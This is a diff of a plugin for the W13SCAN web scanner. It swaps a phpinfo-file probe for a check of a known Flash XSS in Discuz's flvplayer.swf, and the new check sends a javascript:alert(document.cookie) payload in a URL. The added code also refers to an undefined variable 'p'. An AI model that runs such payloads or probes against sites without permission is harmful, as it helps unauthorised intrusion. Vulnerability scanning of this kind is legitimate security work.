@@ -1,19 +1,18 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# @Time    : 2019/7/11 4:27 PM
+# @Time    : 2019/7/20 8:45 PM
 # @Author  : w8ay
-# @File    : phpinfo_craw.py
+# @File    : dzxss.py
 
 import requests
 
-from lib.helper.phpinfo_helper import get_phpinfo
 from lib.output import out
 from lib.plugins import PluginBase
 
 
 class W13SCAN(PluginBase):
-    desc = '''查看此目录下是否存在phpinfo文件'''
-    name = 'phpinfo遍历'
+    name = 'Dz flash xss'
+    desc = '''flash xss'''
 
     def audit(self):
         method = self.requests.command  # 请求方式 GET or POST
@@ -28,18 +27,9 @@ class W13SCAN(PluginBase):
         params = self.requests.params
         netloc = self.requests.netloc
 
-        variants = [
-            "phpinfo.php",
-            "pi.php",
-            "php.php",
-            "i.php",
-            "test.php",
-            "temp.php",
-            "info.php",
-        ]
-        for phpinfo in variants:
-            testURL = url.strip('/') + "/" + phpinfo
-            r = requests.get(testURL, headers=headers)
-            if "<title>phpinfo()</title>" in r.text:
-                info = get_phpinfo(r.text)
-                out.success(testURL, self.name, info=info)
+        domain = "{}://{}/".format(p.scheme, p.netloc)
+        payload = domain + "static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);"
+
+        r = requests.get(payload, headers=headers)
+        if r.status_code == 200 and 'CWS' in r.text:
+            out.success(payload, self.name)
